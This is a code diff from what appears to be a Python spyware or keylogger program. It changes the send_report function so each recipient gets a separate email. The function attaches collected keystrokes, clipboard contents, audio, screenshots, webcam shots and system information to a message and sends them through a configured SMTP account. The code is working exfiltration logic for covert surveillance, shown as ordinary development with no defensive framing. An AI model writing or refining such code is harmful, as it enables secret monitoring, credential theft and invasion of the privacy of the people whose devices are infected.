@@ -198,28 +198,28 @@ def set_wallpaper():
 def send_report():
     print("starting to send the report")
 
-    # Creating the Email Object
-    message = MIMEMultipart()
-    message["From"] = Config.SMTP_USERNAME
-    message["To"] = ", ".join(Config.EMAIL_ADDRESS)
-    message["Subject"] = f"Report {datetime.datetime.now()}"
+    for to_mail in Config.EMAIL_ADDRESS:
+        # Creating the Email Object
+        message = MIMEMultipart()
+        message["From"] = Config.SMTP_USERNAME
+        message["To"] = to_mail
+        message["Subject"] = f"Report {datetime.datetime.now()}"
 
-    body_part = MIMEText(f"Report {datetime.datetime.now()}")
-    message.attach(body_part)
+        body_part = MIMEText(f"Report {datetime.datetime.now()}")
+        message.attach(body_part)
 
-    files = [system_info, clipboard_info, audio_info, screenshot_info, webCamShot_info, keystrokes_info]
+        files = [system_info, clipboard_info, audio_info, screenshot_info, webCamShot_info, keystrokes_info]
 
-    for file in files:
-        if os.path.isfile(file): 
-            with open(file,'rb') as _file: 
-                message.attach(MIMEApplication(_file.read(), Name=os.path.split(file)[1]))
+        for file in files:
+            if os.path.isfile(file): 
+                with open(file,'rb') as _file: 
+                    message.attach(MIMEApplication(_file.read(), Name=os.path.split(file)[1]))
 
-    with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
-        server.starttls()
-        server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
-        # for each email in the array send email message
-        for email in Config.EMAIL_ADDRESS: server.sendmail(from_addr=Config.SMTP_USERNAME, to_addrs=email, msg=message)
-        print(f"email sent at {datetime.datetime.now()}")
+        with smtplib.SMTP(Config.SMTP_SERVER, Config.SMTP_PORT) as server:
+            server.starttls()
+            server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
+            server.send_message(message)
+            print(f"email sent at {datetime.datetime.now()}")
 
 def main():
     system_information()
